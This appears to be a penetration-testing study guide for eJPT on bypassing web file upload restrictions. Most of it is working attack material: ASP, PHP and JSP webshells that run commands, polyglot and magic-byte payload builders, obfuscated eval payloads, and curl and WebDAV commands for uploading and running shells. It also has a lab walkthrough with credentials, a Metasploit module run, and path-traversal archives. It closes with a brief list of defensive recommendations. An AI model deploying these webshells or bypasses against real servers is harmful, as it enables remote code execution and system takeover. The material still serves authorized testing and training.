# üö´ File Upload Bypass Techniques - Complete Guide

Comprehensive guide to bypassing file upload restrictions and security controls in web applications for penetration testing and security assessment.

**Location in Framework:** `web-pentesting/file-upload/file-upload-bypass-techniques.md`

---

## üéØ Overview

File upload bypass techniques are methods used to circumvent security controls that restrict file uploads in web applications. These vulnerabilities occur when web applications allow users to upload files without proper validation, enabling attackers to upload malicious files like webshells that can lead to remote code execution, data compromise, or complete system takeover.

**Key Attack Vectors:**
- **File Extension Manipulation:** Bypassing blacklist/whitelist controls
- **MIME Type Spoofing:** Fooling Content-Type validation
- **File Content Manipulation:** Embedding malicious code in legitimate formats
- **HTTP Method Abuse:** Exploiting WebDAV and alternative upload methods
- **Client-Side Bypass:** Circumventing frontend validation

---

## üîç Common Upload Restrictions and Validation Methods

### Server-Side Validation Controls

#### 1. File Extension Filtering
- **Blacklist Approach:** Blocks specific dangerous extensions (.php, .asp, .jsp)
- **Whitelist Approach:** Only allows specific safe extensions (.jpg, .png, .txt)

#### 2. MIME Type Validation
- **Content-Type Header Checking:** Validates HTTP Content-Type header
- **File Signature Verification:** Checks magic bytes/file headers
- **Multi-layer MIME Validation:** Combines header and content analysis

#### 3. File Content Analysis
- **Antivirus Scanning:** Real-time malware detection
- **Content Structure Validation:** Verifies file format integrity
- **Script Detection:** Identifies embedded executable code

#### 4. File Size and Upload Restrictions
- **Maximum File Size Limits:** Prevents large file uploads
- **Upload Quota Management:** Limits per-user upload capacity
- **File Count Restrictions:** Controls number of uploaded files

### Client-Side Validation Methods
- **JavaScript Validation:** Frontend file type and size checking
- **HTML Input Restrictions:** `accept` attribute limitations
- **Form Field Validation:** Client-side validation scripts

---

## üõ†Ô∏è Comprehensive Bypass Techniques

### 1. File Extension Bypass Methods

#### Double Extension Technique
```bash
# Common double extension bypasses
shell.php.jpg      # PHP code with image extension
backdoor.asp.png   # ASP script with image extension
webshell.jsp.gif   # JSP payload with image extension
payload.aspx.txt   # ASPX code with text extension
```

#### Case Manipulation
```bash
# Case-based bypasses for case-insensitive systems
shell.PHP          # Uppercase extension
backdoor.Asp       # Mixed case
webshell.AsP       # Alternate case pattern
payload.pHp        # Random case mixing
```

#### Special Character Injection
```bash
# Character-based bypass techniques
shell.php%00.jpg    # Null byte injection (legacy PHP < 5.3.4)
backdoor.asp.       # Trailing dot (Windows)
webshell.php::$DATA # NTFS Alternate Data Stream
payload.php%20      # URL-encoded space
```

#### Alternative Executable Extensions
| Server Technology | Primary Extension | Alternative Extensions |
|-------------------|-------------------|------------------------|
| **PHP** | .php | .php3, .php4, .php5, .phtml, .pht, .inc |
| **ASP/ASP.NET** | .asp, .aspx | .asa, .cer, .cdx, .aspx |
| **JSP** | .jsp | .jspx, .jspf, .jspa, .jsw |
| **Perl** | .pl | .pm, .cgi, .perl |
| **Python** | .py | .pyw, .pyc, .pyo |

### 2. MIME Type Spoofing Techniques

#### Content-Type Header Manipulation
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

#### Common MIME Type Spoofs
```bash
# Malicious File ‚Üí Spoofed Content-Type
shell.php ‚Üí image/jpeg
backdoor.asp ‚Üí text/plain
payload.jsp ‚Üí application/pdf
webshell.aspx ‚Üí image/png
script.pl ‚Üí text/html
```

#### Command-Line MIME Spoofing
```bash
# Using curl for MIME type bypass
curl -X POST -H "Content-Type: multipart/form-data" \
     -F "file=@shell.php;type=image/jpeg" \
     http://target.com/upload.php

# Alternative method with explicit Content-Type
curl -X POST -F "file=@malicious.php" \
     -H "Content-Type: image/jpeg" \
     http://target.com/upload.php
```

### 3. File Content Manipulation

#### Magic Bytes Injection
```bash
# Add legitimate file signatures before malicious code

# JPEG signature + PHP payload
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01<?php system($_GET["cmd"]); ?>' > image.php

# PNG signature + PHP payload  
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > image.php

# GIF signature + PHP payload
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > image.php
```

#### Polyglot File Creation
```bash
# Create file that functions as both valid image and executable script
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xFF\xFE\x00\x13Created with GIMP\xFF\xDB\x00C\x00' > polyglot.php
echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' >> polyglot.php
```

#### Steganographic Techniques
```bash
# Hide malicious code within legitimate files
steghide embed -cf legitimate_image.jpg -ef webshell.php
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 4. WebDAV-Specific Bypass Techniques

#### HTTP Method Exploitation
```bash
# Direct PUT method upload
curl -X PUT -T shell.asp -u user:password http://target.com/webdav/shell.asp

# MOVE method for file renaming
curl -X MOVE -H "Destination: /webdav/shell.asp" \
     -u user:password http://target.com/webdav/shell.txt
```

#### File Extension Workaround (Metasploit Technique)
```bash
# Upload as safe extension, then rename to dangerous extension
# Step 1: Upload payload as .txt file
curl -X PUT -T payload.txt -u user:password http://target.com/webdav/payload.txt

# Step 2: Use MOVE method to rename to .asp
curl -X MOVE -H "Destination: /webdav/payload.asp" \
     -u user:password http://target.com/webdav/payload.txt

# Step 3: Execute the .asp file
curl http://target.com/webdav/payload.asp?cmd=whoami
```

#### Directory Traversal in WebDAV
```bash
# Upload files to different directories using cadaver
cadaver http://target.com/webdav/
dav:/webdav/> put shell.asp ../../../inetpub/wwwroot/shell.asp
dav:/webdav/> put backdoor.php ../../uploads/backdoor.php
```

---

## üß™ Practical Lab Examples and Real-World Scenarios

### Lab Example: WebDAV IIS Server Exploitation

**Scenario:** Windows IIS server with WebDAV enabled, requiring authentication
- **Target:** demo.ine.local WebDAV service
- **Authentication:** bob:password_123321
- **Objective:** Upload and execute ASP webshell

#### Method 1: Capability Testing with davtest
```bash
# Test WebDAV capabilities and authentication
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/

# Expected results analysis:
# PUT asp SUCCEED - Can upload ASP files
# EXEC asp SUCCEED - Can execute ASP files
```

**Lab Results Interpretation:**
```
PUT    asp    SUCCEED:    http://demo.ine.local/webdav/DavTestDir_JIP03NgL9rKBLqB/davtest_JIP03NgL9rKBLqB.asp
EXEC   asp    SUCCEED:    http://demo.ine.local/webdav/DavTestDir_JIP03NgL9rKBLqB/davtest_JIP03NgL9rKBLqB.asp
```

#### Method 2: Manual Upload via Cadaver
```bash
# Interactive WebDAV client session
cadaver http://demo.ine.local/webdav/
Username: bob
Password: password_123321

# Upload webshell from Kali Linux collection
dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
dav:/webdav/> ls
dav:/webdav/> quit
```

#### Method 3: Automated Metasploit Bypass
```bash
# Metasploit handles bypass automatically
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob  
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit

# Automated process:
# [*] Uploading 609542 bytes to /webdav/metasploit159423466.txt...
# [*] Moving /webdav/metasploit159423466.txt to /webdav/metasploit159423466.asp...
# [*] Executing /webdav/metasploit159423466.asp...
```

#### Method 4: Manual Command Execution
```bash
# Direct access to uploaded webshell
curl "http://demo.ine.local/webdav/webshell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=systeminfo"
```

### Additional Common Scenarios

#### Scenario 1: Extension Blacklist Bypass
```bash
# Problem: Server blocks .php, .asp, .jsp extensions
# Solution: Use alternative executable extensions

# Test alternative PHP extensions
upload_file.php3   # PHP 3.x legacy extension
upload_file.phtml  # PHP HTML template
upload_file.php5   # PHP 5.x specific extension
upload_file.inc    # Include file (often executable)
```

#### Scenario 2: MIME Type Validation Only
```bash
# Problem: Server validates Content-Type but ignores file content
# Solution: Upload malicious file with legitimate MIME type

curl -X POST -H "Content-Type: multipart/form-data" \
     -F "file=@shell.php;type=image/jpeg" \
     http://target.com/upload.php
```

#### Scenario 3: Client-Side Validation Bypass
```bash
# Problem: JavaScript blocks certain file types in browser
# Solution: Use proxy tools to bypass client-side restrictions

# Intercept with Burp Suite:
# 1. Upload legitimate file type to pass JS validation
# 2. Intercept request in Burp Suite
# 3. Change filename and Content-Type to malicious values
# 4. Forward modified request
```

---

## üîß Tools and Testing Framework

### Essential Tools for File Upload Testing

#### Manual Testing Tools
| Tool | Purpose | Usage Example |
|------|---------|---------------|
| **Burp Suite** | Request interception/modification | Intercept upload, modify headers |
| **OWASP ZAP** | Automated security scanning | Scan for upload vulnerabilities |
| **curl** | Command-line HTTP client | Manual upload testing |
| **wget** | File download/upload | Alternative HTTP client |

#### WebDAV-Specific Tools
| Tool | Purpose | Usage Example |
|------|---------|---------------|
| **davtest** | WebDAV capability testing | `davtest -auth user:pass -url http://target/webdav/` |
| **cadaver** | Interactive WebDAV client | `cadaver http://target/webdav/` |
| **nikto** | Web vulnerability scanner | WebDAV enumeration and testing |
| **nmap** | Network service discovery | `nmap --script http-webdav-scan target` |

#### Payload Generation Tools
| Tool | Purpose | Usage Example |
|------|---------|---------------|
| **msfvenom** | Payload generation | `msfvenom -p php/meterpreter/reverse_tcp` |
| **Weevely** | PHP webshell generator | `weevely generate password shell.php` |
| **China Chopper** | ASP/ASPX webshell | Pre-built webshell collection |

### Webshell Examples and Payloads

#### ASP Webshells (IIS Servers)
```asp
<%@ Language="VBScript" %>
<%
If Request.QueryString("cmd") <> "" Then
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec(Request.QueryString("cmd"))
    Response.Write "<pre>" & objExec.StdOut.ReadAll & "</pre>"
End If
%>
```

#### PHP Webshells (Apache/Nginx)
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $output = shell_exec($_GET['cmd']);
    echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
    echo "</pre>";
}
?>
```

#### JSP Webshells (Tomcat)
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

---

## üìã Complete Testing Methodology

### Phase 1: Information Gathering
```bash
# Discover file upload functionality
nmap --script http-enum -p 80,443,8080 target.com
nikto -h http://target.com
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Look for upload endpoints
grep -r "upload" /path/to/wordlists/
ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 404
```

### Phase 2: Baseline Testing
```bash
# Test legitimate file upload first
echo "test content" > test.txt
curl -X POST -F "file=@test.txt" http://target.com/upload.php

# Test with common image file
curl -X POST -F "file=@image.jpg" http://target.com/upload.php
```

### Phase 3: Extension Testing
```bash
# Systematic extension testing
for ext in php php3 php4 php5 phtml asp aspx asa jsp jspx pl py; do
    echo "<?php system(\$_GET['cmd']); ?>" > test.$ext
    curl -X POST -F "file=@test.$ext" http://target.com/upload.php
    echo "Tested: $ext"
done
```

### Phase 4: MIME Type Testing
```bash
# Test MIME type spoofing
malicious_types=("image/jpeg" "image/png" "text/plain" "application/pdf")
for mime in "${malicious_types[@]}"; do
    curl -X POST -F "file=@shell.php;type=$mime" http://target.com/upload.php
    echo "Tested MIME: $mime"
done
```

### Phase 5: WebDAV Testing
```bash
# WebDAV capability assessment
davtest -url http://target.com/webdav/
davtest -auth username:password -url http://target.com/webdav/

# Manual WebDAV testing
curl -X OPTIONS http://target.com/webdav/
curl -X PROPFIND http://target.com/webdav/
```

### Phase 6: Advanced Bypass Testing
```bash
# Polyglot file testing
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > polyglot.php
curl -X POST -F "file=@polyglot.php;type=image/png" http://target.com/upload.php

# Archive extraction testing
zip payload.zip shell.php
curl -X POST -F "file=@payload.zip" http://target.com/upload.php
```

---

## üõ°Ô∏è Advanced Defense Evasion Techniques

### 1. Steganographic Hiding
```bash
# Hide PHP code within image metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' -overwrite_original image.jpg

# Steghide embedding
steghide embed -cf cover.jpg -ef payload.php -sf stego.jpg

# Manual EXIF injection
echo '<?php system($_GET["cmd"]); ?>' | base64 | xargs -I {} exiftool -UserComment={} image.jpg
```

### 2. Archive-Based Bypasses
```bash
# ZIP archive with path traversal
zip -r payload.zip ../../../var/www/html/shell.php

# RAR archive with webshell
rar a payload.rar shell.php

# TAR archive bypass
tar -czf payload.tar.gz shell.php
```

### 3. Encoding and Obfuscation
```bash
# Base64 encoded payload
echo '<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>' > encoded.php

# ROT13 obfuscation
echo '<?php eval(str_rot13("flfgrz(\$_TRG[\"pzq\"]);")); ?>' > obfuscated.php

# Hex encoding
echo '<?php eval(hex2bin("73797374656d28245f4745545b27636d64275d293b")); ?>' > hex.php
```

### 4. Polyglot File Techniques
```bash
# GIF + PHP polyglot
printf 'GIF89a\x0a<?php system($_GET["cmd"]); ?>' > polyglot.gif

# PDF + PHP polyglot  
printf '%%PDF-1.4\x0a<?php system($_GET["cmd"]); ?>' > polyglot.pdf

# Multi-format polyglot
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01GIF89a<?php system($_GET["cmd"]); ?>' > multi.jpg
```

---

## üéØ eJPT Exam Focus and Key Takeaways

### Critical Knowledge for eJPT Certification

#### 1. WebDAV Exploitation Priority
- **davtest usage:** Understand PUT vs EXEC success indicators
- **Authentication handling:** Know how to test with credentials
- **Metasploit integration:** Recognize automated bypass capabilities
- **Manual verification:** Ability to confirm successful uploads

#### 2. Essential Bypass Techniques
```bash
# Key techniques for exam success
1. Alternative extensions: .php ‚Üí .phtml, .php3
2. MIME type spoofing: malicious.php with image/jpeg type
3. WebDAV method abuse: PUT, MOVE, COPY methods
4. Double extensions: shell.php.jpg patterns
```

#### 3. Tool Proficiency Requirements
- **davtest:** Capability testing and result interpretation
- **curl:** Manual upload testing and verification
- **Burp Suite:** Request interception and modification
- **Metasploit:** Automated exploitation modules

#### 4. Common Exam Scenarios
- **IIS WebDAV servers:** Authentication-protected upload endpoints
- **Apache file upload:** Extension blacklist bypass scenarios  
- **Client-side validation:** JavaScript restriction bypasses
- **MIME type filtering:** Content-Type header manipulation

### Exam Strategy Checklist
```
Pre-Engagement:
‚òê Identify file upload functionality (forms, WebDAV, APIs)
‚òê Enumerate supported file types and restrictions
‚òê Test authentication requirements and methods

During Testing:
‚òê Run davtest for WebDAV capability assessment
‚òê Test alternative file extensions systematically
‚òê Attempt MIME type spoofing with curl
‚òê Try polyglot files if content inspection exists
‚òê Verify successful uploads and execution capability

Post-Exploitation:
‚òê Confirm remote code execution capability
‚òê Test command execution through uploaded shell
‚òê Document bypass technique used for reporting
‚òê Clean up uploaded files if required
```

---

## ‚ö†Ô∏è Common Pitfalls and Troubleshooting

### Issue 1: Upload Successful but File Not Accessible
**Symptoms:** File uploads without errors but returns 404 when accessed
**Solutions:**
```bash
# Check file permissions and ownership
ls -la /uploaded/files/directory/

# Try different access paths
curl http://target.com/uploads/shell.php
curl http://target.com/files/shell.php  
curl http://target.com/upload/shell.php

# Test with different HTTP methods
curl -X GET http://target.com/uploads/shell.php
curl -X POST http://target.com/uploads/shell.php
```

### Issue 2: File Gets Renamed or Modified
**Symptoms:** Uploaded files have different names or content
**Solutions:**
```bash
# Check for auto-renaming patterns
# Original: shell.php ‚Üí Renamed: shell_1234.php
# Look for timestamp or hash additions

# Use WebDAV if available (bypasses renaming)
curl -X PUT -T shell.php http://target.com/webdav/shell.php

# Try directory listing to find actual filename
curl -X PROPFIND http://target.com/webdav/
```

### Issue 3: Content Filtering Blocks Upload
**Symptoms:** Upload fails with content validation errors
**Solutions:**
```bash
# Encode malicious payload
echo '<?php system($_GET["cmd"]); ?>' | base64

# Use steganographic hiding
steghide embed -cf image.jpg -ef shell.php

# Split payload across multiple files
echo '<?php ' > part1.php
echo 'system($_GET["cmd"]); ?>' > part2.php
```

### Issue 4: WebDAV Authentication Issues  
**Symptoms:** 401 Unauthorized or 403 Forbidden responses
**Solutions:**
```bash
# Try different authentication methods
davtest -auth user:pass -url http://target/webdav/
curl -u user:pass -X OPTIONS http://target/webdav/

# Test for default credentials
davtest -auth admin:admin -url http://target/webdav/
davtest -auth guest:guest -url http://target/webdav/
```

---

## üîó Additional Resources and References

### Webshell Collections and Repositories
- **Kali Linux:** `/usr/share/webshells/` (Built-in collection)
- **SecLists:** GitHub repository with extensive webshell collection
- **Laudanum:** Collection of injectable files for various platforms
- **b374k:** PHP webshell with advanced features

### Practice Platforms and Labs
- **DVWA:** File Upload module with different security levels
- **WebGoat:** OWASP file upload vulnerability lessons
- **VulnHub:** Vulnerable VMs with file upload challenges
- **HackTheBox:** Real-world file upload scenarios

### Documentation and Standards
- **OWASP Testing Guide:** File upload testing methodology
- **WebDAV RFC 4918:** Protocol specification and security considerations  
- **CWE-434:** Unrestricted Upload of File with Dangerous Type
- **NIST Guidelines:** Secure file upload implementation practices

### Advanced Reading
- **File Upload Restrictions Bypass:** Advanced techniques research papers
- **Polyglot Files:** Multi-format file creation methodologies
- **WebDAV Security:** Protocol-specific attack vectors and defenses
- **Content-Type Spoofing:** HTTP header manipulation techniques

---

## üìù Final Notes and Best Practices

### Security Testing Guidelines
1. **Always obtain proper authorization** before testing file upload vulnerabilities
2. **Use isolated test environments** to prevent accidental system compromise
3. **Document all bypass techniques** used for comprehensive reporting
4. **Clean up uploaded files** after testing to maintain system integrity
5. **Verify impact scope** of successful file upload vulnerabilities

### Defensive Recommendations
1. **Implement whitelist-based filtering** instead of blacklist approaches
2. **Validate both file extensions and content** using multiple verification layers  
3. **Store uploaded files outside web root** to prevent direct execution
4. **Use content inspection tools** to detect embedded malicious code
5. **Implement proper file permissions** and access controls
6. **Disable unnecessary HTTP methods** especially in WebDAV configurations
7. **Regular security assessments** of file upload functionality

This comprehensive guide provides the knowledge and practical techniques needed for successful file upload bypass testing in penetration testing engagements and certification exams like eJPT.
